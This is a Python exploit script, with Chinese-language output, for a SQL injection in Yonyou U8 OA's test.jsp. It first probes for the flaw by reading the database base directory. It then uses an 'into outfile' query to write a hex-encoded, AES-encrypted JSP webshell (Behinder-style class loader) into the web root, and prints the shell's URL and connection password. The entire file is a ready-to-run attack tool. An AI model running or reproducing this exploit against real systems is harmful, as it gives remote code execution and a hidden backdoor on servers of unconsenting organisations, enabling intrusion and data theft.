import requests
import sys
import random
import re
import base64
import time
import json
from requests.packages.urllib3.exceptions import InsecureRequestWarning

def title():
    print('+------------------------------------------')
    print('+  \033[34mVersion:     用友 U8 OA test.jsp SQL注入漏洞                              \033[0m')
    print('+  \033[36m使用格式:    python3 getshell_exp.py                                     \033[0m')
    print('+  \033[36mURL地址:     http://xxx.xxx.xxx.xxx                                     \033[0m')
    print('+------------------------------------------')

def POC_1(target_url):
    vuln_url = target_url + "/yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%20@@basedir)"
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.get(url=vuln_url, verify=False, timeout=5)
        if '序号' in response.text and "@@basedir" in response.text and response.status_code == 200:
            OA_dir = re.findall(r'>(.*)\\mysql\\', response.text)[0]
            OA_dir = OA_dir.replace("\\","/")
            print("\033[32m[+]目标 {} 存在SQL注入漏洞".format(target_url))
            webshell_name = "update_{}.jsp".format(random.randint(1,5))
            OA_dir = OA_dir + "/tomcat/webapps/yyoa/{}".format(webshell_name)
            POC_2(target_url, OA_dir, webshell_name)
        else:
            print("\033[31m[x]目标 {} 不存在SQL注入漏洞 \033[0m".format(target_url))
    except Exception as e:
        print("\033[31m[x]目标 {} 请求失败 \033[0m".format(target_url), e)

def POC_2(target_url, OA_dir, webshell_name):
    vuln_url = target_url + "/yyoa/common/js/menu/test.jsp?doType=101&S1=select%20unhex(%273c25407061676520696d706f72743d226a6176612e7574696c2e2a2c6a617661782e63727970746f2e2a2c6a617661782e63727970746f2e737065632e2a22253e3c2521636c617373205520657874656e647320436c6173734c6f616465727b5528436c6173734c6f616465722063297b73757065722863293b7d7075626c696320436c61737320672862797465205b5d62297b72657475726e2073757065722e646566696e65436c61737328622c302c622e6c656e677468293b7d7d253e3c2569662028726571756573742e6765744d6574686f6428292e657175616c732822504f53542229297b537472696e67206b3d2235383233636433303933663136663362223b73657373696f6e2e70757456616c7565282275222c6b293b43697068657220633d4369706865722e676574496e7374616e6365282241455322293b632e696e697428322c6e6577205365637265744b657953706563286b2e676574427974657328292c224145532229293b6e6577205528746869732e676574436c61737328292e676574436c6173734c6f616465722829292e6728632e646f46696e616c286e65772073756e2e6d6973632e4241534536344465636f64657228292e6465636f646542756666657228726571756573742e67657452656164657228292e726561644c696e6528292929292e6e6577496e7374616e636528292e657175616c732870616765436f6e74657874293b7d253e%27)%20%20into%20outfile%20%27{}%27".format(OA_dir)
    webshell_dir = target_url +"/yyoa/"+ webshell_name
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.get(url=vuln_url, verify=False, timeout=5)
        if 'already' in response.text and  response.status_code == 200:
            print("\033[32m[+]文件写入木马上传失败，目标已存在相同文件，请重新运行\033[0m")
        elif "No Data" in response.text and  response.status_code == 200:
            print("\033[32m[+]文件写入木马上传成功，上传路径为 {}\033[0m".format(webshell_dir))
            print("\033[32m[+]请使用冰蝎连接，密码为: bxmm\033[0m")
        else:
            print("\033[31m[x] 目标 {} 木马上传失败 \033[0m".format(target_url))
    except Exception as e:
        print("\033[31m[x] 目标 {} 请求失败 \033[0m".format(target_url), e)


if __name__ == '__main__':
    title()
    target_url = str(input("\033[35m请输入需要检测的URL地址：\033[0m"))
    POC_1(target_url)
